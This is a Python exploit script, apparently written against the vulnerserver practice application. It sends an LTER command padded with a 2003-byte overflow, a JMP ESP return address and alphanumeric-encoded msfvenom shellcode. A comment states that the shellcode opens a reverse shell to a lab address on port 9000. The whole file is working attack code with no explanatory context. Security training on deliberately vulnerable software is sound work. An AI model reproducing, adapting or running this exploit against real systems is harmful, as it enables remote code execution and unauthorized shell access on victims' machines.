import socket, sys, struct

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.139 LPORT=9000 -f py -e x86/alpha_mixed BufferRegister=ESP EXITFUNC=thread > shellcode
# Payload size: 702 bytes

buf =  b""
buf += b"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += b"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += b"\x69\x6c\x58\x68\x6f\x72\x55\x50\x57\x70\x43\x30\x53"
buf += b"\x50\x4d\x59\x69\x75\x45\x61\x59\x50\x35\x34\x4e\x6b"
buf += b"\x76\x30\x74\x70\x4c\x4b\x61\x42\x56\x6c\x6c\x4b\x32"
buf += b"\x72\x42\x34\x6c\x4b\x71\x62\x55\x78\x74\x4f\x4e\x57"
buf += b"\x73\x7a\x44\x66\x66\x51\x49\x6f\x6e\x4c\x77\x4c\x45"
buf += b"\x31\x51\x6c\x65\x52\x76\x4c\x47\x50\x6a\x61\x38\x4f"
buf += b"\x64\x4d\x77\x71\x69\x57\x59\x72\x4a\x52\x46\x32\x42"
buf += b"\x77\x4e\x6b\x32\x72\x66\x70\x6e\x6b\x42\x6a\x75\x6c"
buf += b"\x6e\x6b\x50\x4c\x64\x51\x73\x48\x39\x73\x72\x68\x43"
buf += b"\x31\x68\x51\x32\x71\x6c\x4b\x43\x69\x67\x50\x53\x31"
buf += b"\x58\x53\x6e\x6b\x33\x79\x52\x38\x49\x73\x54\x7a\x50"
buf += b"\x49\x6c\x4b\x34\x74\x4e\x6b\x36\x61\x58\x56\x74\x71"
buf += b"\x39\x6f\x6e\x4c\x4a\x61\x38\x4f\x64\x4d\x75\x51\x4b"
buf += b"\x77\x37\x48\x79\x70\x50\x75\x48\x76\x53\x33\x63\x4d"
buf += b"\x39\x68\x67\x4b\x71\x6d\x35\x74\x61\x65\x58\x64\x46"
buf += b"\x38\x6c\x4b\x62\x78\x51\x34\x56\x61\x4b\x63\x32\x46"
buf += b"\x6e\x6b\x66\x6c\x52\x6b\x6e\x6b\x32\x78\x77\x6c\x67"
buf += b"\x71\x39\x43\x4c\x4b\x66\x64\x4e\x6b\x56\x61\x4a\x70"
buf += b"\x6b\x39\x31\x54\x34\x64\x64\x64\x63\x6b\x53\x6b\x51"
buf += b"\x71\x46\x39\x43\x6a\x43\x61\x69\x6f\x4d\x30\x61\x4f"
buf += b"\x71\x4f\x43\x6a\x6e\x6b\x37\x62\x78\x6b\x4e\x6d\x31"
buf += b"\x4d\x35\x38\x77\x43\x66\x52\x75\x50\x35\x50\x30\x68"
buf += b"\x64\x37\x74\x33\x35\x62\x31\x4f\x42\x74\x33\x58\x62"
buf += b"\x6c\x31\x67\x37\x56\x56\x67\x59\x6f\x6e\x35\x78\x38"
buf += b"\x4e\x70\x47\x71\x73\x30\x77\x70\x61\x39\x68\x44\x42"
buf += b"\x74\x50\x50\x51\x78\x77\x59\x6d\x50\x50\x6b\x47\x70"
buf += b"\x69\x6f\x4a\x75\x32\x70\x66\x30\x66\x30\x50\x50\x51"
buf += b"\x50\x52\x70\x61\x50\x70\x50\x72\x48\x39\x7a\x74\x4f"
buf += b"\x69\x4f\x6b\x50\x6b\x4f\x68\x55\x5a\x37\x72\x4a\x56"
buf += b"\x65\x35\x38\x39\x50\x39\x38\x35\x34\x4e\x6b\x75\x38"
buf += b"\x54\x42\x35\x50\x46\x43\x57\x58\x4c\x49\x49\x76\x72"
buf += b"\x4a\x44\x50\x43\x66\x31\x47\x71\x78\x6c\x59\x6d\x75"
buf += b"\x33\x44\x70\x61\x6b\x4f\x6a\x75\x6d\x55\x6b\x70\x31"
buf += b"\x64\x36\x6c\x79\x6f\x50\x4e\x74\x48\x61\x65\x6a\x4c"
buf += b"\x51\x78\x78\x70\x6c\x75\x79\x32\x70\x56\x79\x6f\x4e"
buf += b"\x35\x50\x68\x32\x43\x50\x6d\x65\x34\x43\x30\x4b\x39"
buf += b"\x38\x63\x32\x77\x31\x47\x42\x77\x36\x51\x58\x76\x43"
buf += b"\x5a\x62\x32\x56\x39\x63\x66\x78\x62\x59\x6d\x73\x56"
buf += b"\x4b\x77\x73\x74\x76\x44\x57\x4c\x67\x71\x35\x51\x6e"
buf += b"\x6d\x61\x54\x77\x54\x54\x50\x4f\x36\x75\x50\x32\x64"
buf += b"\x42\x74\x46\x30\x51\x46\x73\x66\x31\x46\x50\x46\x31"
buf += b"\x46\x32\x6e\x56\x36\x66\x36\x50\x53\x56\x36\x65\x38"
buf += b"\x71\x69\x38\x4c\x57\x4f\x6f\x76\x6b\x4f\x68\x55\x6b"
buf += b"\x39\x59\x70\x50\x4e\x70\x56\x53\x76\x6b\x4f\x56\x50"
buf += b"\x30\x68\x63\x38\x6b\x37\x45\x4d\x73\x50\x4b\x4f\x6e"
buf += b"\x35\x6f\x4b\x79\x70\x45\x4d\x44\x6a\x34\x4a\x42\x48"
buf += b"\x4e\x46\x4c\x55\x4d\x6d\x4d\x4d\x79\x6f\x4e\x35\x37"
buf += b"\x4c\x36\x66\x51\x6c\x36\x6a\x6b\x30\x49\x6b\x69\x70"
buf += b"\x52\x55\x37\x75\x6f\x4b\x63\x77\x34\x53\x32\x52\x62"
buf += b"\x4f\x52\x4a\x57\x70\x63\x63\x79\x6f\x58\x55\x41\x41"

jmpesp = struct.pack("<I", 0x62501203)

buffer = "LTER /.:/" + "A" * 2003 + jmpesp + buf + "C" * 200

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = sys.argv[1]

s.connect((host, 9999))

s.send(buffer)

s.close()
